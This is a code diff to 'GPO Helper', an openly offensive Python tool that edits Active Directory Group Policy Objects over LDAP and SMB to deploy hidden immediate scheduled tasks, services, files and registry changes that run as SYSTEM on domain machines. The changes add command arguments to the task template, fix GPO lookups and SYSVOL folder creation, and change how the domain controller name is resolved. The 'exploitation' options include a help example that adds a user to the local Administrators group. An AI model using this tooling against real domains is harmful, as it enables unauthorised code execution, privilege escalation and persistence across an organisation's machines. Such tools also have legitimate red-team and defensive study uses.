@@ -169,7 +169,7 @@ class GPOhelper:
         self.template_service = '<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}" name="CHANGEME_NAME" image="2" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT"><Properties startupType="AUTOMATIC" serviceName="CHANGEME_NAME" serviceAction="CHANGEME_ACTION" timeout="30" accountName="LocalSystem" interact="0"/></NTService></NTServices>'
 
         self.template_task_new = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"></ScheduledTasks>'
-        self.template_task = '<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="CHANGEME_TASKNAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT" removePolicy="0"><Properties action="C" name="CHANGEME_TASKNAME" runAs="CHANGEME_USER" logonType="S4U"><Task version="1.2"><RegistrationInfo><Author>CHANGEME_AUTHOR</Author><Description>CHANGEME_DESCRIPTION</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>CHANGEME_USER</UserId><LogonType>S4U</LogonType><RunLevel>HighestPrivilege</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>CHANGEME_LOCATION</Command></Exec></Actions></Task></Properties></ImmediateTaskV2></ScheduledTasks>'
+        self.template_task = '<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="CHANGEME_TASKNAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT" removePolicy="0"><Properties action="C" name="CHANGEME_TASKNAME" runAs="CHANGEME_USER" logonType="S4U"><Task version="1.2"><RegistrationInfo><Author>CHANGEME_AUTHOR</Author><Description>CHANGEME_DESCRIPTION</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>CHANGEME_USER</UserId><LogonType>S4U</LogonType><RunLevel>HighestPrivilege</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>CHANGEME_LOCATION</Command><Arguments>CHANGEME_ARGS</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2></ScheduledTasks>'
 
     def ldap3_kerberos_login(self,connection, target, user, password, domain='', lmhash=None, nthash=None, aesKey='', kdcHost=None,
                             TGT=None, TGS=None, useCache=True):
@@ -427,6 +427,8 @@ class GPOhelper:
         return str(uuid.uuid4()).upper()
 
     def updateGUID(self, info, action, policies, dn):
+        if not info:
+            info = [["Core GPO Engine"]]
         if action != "":
             info[0].append(action)
         tmp = policies
@@ -439,7 +441,7 @@ class GPOhelper:
             raise
 
     def extractInfo(self, gpo):
-        gpoInfo = self.ldapGPOInfo("*", gpo)
+        gpoInfo = self.ldapGPOInfo(gpo, "*")
         dn = gpoInfo[0]["dn"]
         origPath = str(gpoInfo[0]["gPCFileSysPath"])
         path = self.fixPath(origPath)
@@ -654,7 +656,7 @@ class GPOhelper:
         return path
 
     def updateVersion(self, gpo):
-        searchFilter = "(&(objectCategory=groupPolicyContainer)(name=%s))" % gpo
+        searchFilter = "(&(objectCategory=groupPolicyContainer)(displayName=%s))" % gpo
         target = self.get_machine_name(self.__options, self.__domain)
         if self.ldapconn == '':
             if self.__options.use_ldaps is True:
@@ -733,7 +735,7 @@ class GPOhelper:
         if srcPath[:2] != "\\\\":
             self.SMBUploadFile(srcPath, remotePath)
 
-        if "Files" in info[0]:
+        if info and "Files" in info[0]:
             k = ""
             try:
                 orig = self.SMBReadFile(xmlPath)
@@ -743,6 +745,10 @@ class GPOhelper:
                 raise
         else:
             k = "Files"
+            try:
+                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences")
+            except:
+                pass
             try:
                 self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences\\Files")
             except:
@@ -773,7 +779,7 @@ class GPOhelper:
         if self.smbconn == '':
             self.conn2smb()
 
-        if "Files" in info[0]:
+        if info and "Files" in info[0]:
             k = ""
             try:
                 orig = self.SMBReadFile(xmlPath)
@@ -783,6 +789,10 @@ class GPOhelper:
                 raise
         else:
             k = "Files"
+            try:
+                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences")
+            except:
+                pass
             try:
                 self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences\\Files")
             except:
@@ -812,7 +822,7 @@ class GPOhelper:
         if self.smbconn == '':
             self.conn2smb()
 
-        if "Folders" in info[0]:
+        if info and "Folders" in info[0]:
             k = ""
             try:
                 orig = self.SMBReadFile(xmlPath)
@@ -823,7 +833,11 @@ class GPOhelper:
         else:
             k = "Folders"
             try:
-                self.smbconn.createDirectory('Sysvol', path + "\\" + self.gpopath + "\\Preferences\\Folders")
+                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences")
+            except:
+                pass
+            try:
+                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences\\Folders")
             except:
                 pass
             orig = bytes(self.template_folder_new.encode("utf-8"))
@@ -858,7 +872,7 @@ class GPOhelper:
         if self.smbconn == '':
             self.conn2smb()
 
-        if "Registry" in info[0]:
+        if info and "Registry" in info[0]:
             k = ""
             try:
                 orig = self.SMBReadFile(xmlPath)
@@ -869,7 +883,11 @@ class GPOhelper:
         else:
             k = "Registry"
             try:
-                self.smbconn.createDirectory('SysVol', path + "\\"+ self.gpopath +"\\Preferences\\Registry")
+                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences")
+            except:
+                pass
+            try:
+                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences\\Registry")
             except:
                 pass
             orig = bytes(self.template_registry_new.encode("utf-8"))
@@ -1728,7 +1746,7 @@ displayName={display_name}
         if self.smbconn == '':
             self.conn2smb()
 
-        if "Services" in info[0]:
+        if info and "Services" in info[0]:
             k = ""
             try:
                 orig = self.SMBReadFile(xmlPath)
@@ -1739,7 +1757,11 @@ displayName={display_name}
         else:
             k = "Services"
             try:
-                self.smbconn.createDirectory('Sysvol', path + "\\" + self.gpopath + "\\Preferences\\Services")
+                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences")
+            except:
+                pass
+            try:
+                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences\\Services")
             except:
                 pass
             orig = bytes(self.template_service_new.encode("utf-8"))
@@ -1747,7 +1769,7 @@ displayName={display_name}
             self.SMBWriteFile(xmlPath, modified)
         self.updateGUID(info, k, ['Group Policy Services', 'Services'], dn)
 
-    def GPOImmTask(self, taskname, author, description, location, user, gpo):
+    def GPOImmTask(self, taskname, author, description, location, cmdargs, user, gpo):
         (path, info, dn) = self.extractInfo(gpo)
 
         xmlPath = path + "\\" + self.gpopath + "\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
@@ -1761,11 +1783,12 @@ displayName={display_name}
         template = template.replace("CHANGEME_AUTHOR", author)
         template = template.replace("CHANGEME_DESCRIPTION", description)
         template = template.replace("CHANGEME_LOCATION", location)
+        template = template.replace("CHANGEME_ARGS", cmdargs)
         template = template.replace("CHANGEME_USER", user)
         if self.smbconn == '':
             self.conn2smb()
 
-        if "Scheduled Tasks" in info[0]:
+        if info and "Scheduled Tasks" in info[0]:
             k = ""
             try:
                 orig = self.SMBReadFile(xmlPath)
@@ -1776,7 +1799,11 @@ displayName={display_name}
         else:
             k = "Scheduled Tasks"
             try:
-                self.smbconn.createDirectory('Sysvol', path + "\\"+ self.gpopath + "\\Preferences\\ScheduledTasks")
+                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences")
+            except:
+                pass
+            try:
+                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences\\ScheduledTasks")
             except:
                 pass
             orig = bytes(self.template_task_new.encode("utf-8"))
@@ -1786,8 +1813,21 @@ displayName={display_name}
 
     def get_machine_name(self,args, domain):
         if args.dc_ip is not None:
-            return args.dc_ip
-        return domain
+            s = SMBConnection(args.dc_ip, args.dc_ip)
+        else:
+            s = SMBConnection(domain, domain)
+        try:
+            s.login('', '')
+        except Exception:
+            if s.getServerName() == '':
+                # NTLM may be disabled on the DC (STATUS_NOT_SUPPORTED).
+                # Derive the NetBIOS machine name from dc_ip if it is a FQDN.
+                if args.dc_ip is not None and not args.dc_ip.replace('.', '').isdigit():
+                    return args.dc_ip.split('.')[0]
+                raise Exception('Error while anonymous logging into %s' % domain)
+        else:
+            s.logoff()
+        return s.getServerName()
 
 def parse_args():
     parser = argparse.ArgumentParser(add_help = True, description = "GPO Helper - @TheXC3LL")
@@ -1854,6 +1894,7 @@ def parse_args():
     exploitation.add_argument('-author', action="store", metavar="Task Author", help="Author for Scheduled Task")
     exploitation.add_argument('-taskname', action="store", metavar="Task Name", help="Name for the Scheduled Task")
     exploitation.add_argument('-taskdescription', action="store", metavar="Task description", help="Description for the scheduled task")
+    exploitation.add_argument('-taskcmdline', action="store", metavar="Task arguments", default="", help="Arguments to pass to the command in the scheduled task (e.g. '/c net localgroup Administrators user /add')")
     exploitation.add_argument('-gpoupdatever', action="store_true", help="Update GPO version (GPT.INI file and LDAP object)")
     exploitation.add_argument('-usercontext', action="store_true", help="Execute the GPO in the context of the user")
 
@@ -2104,7 +2145,8 @@ def main():
             user = options.gpoimmuser
         else:
             user = "NT Authority\\System"
-        helper.GPOImmTask(options.taskname, options.author, options.taskdescription, options.dstpath, user, options.name)
+        cmdargs = options.taskcmdline if options.taskcmdline is not None else ""
+        helper.GPOImmTask(options.taskname, options.author, options.taskdescription, options.dstpath, cmdargs, user, options.name)
         helper.updateVersion(options.name)
 
     # -gpoupdatever
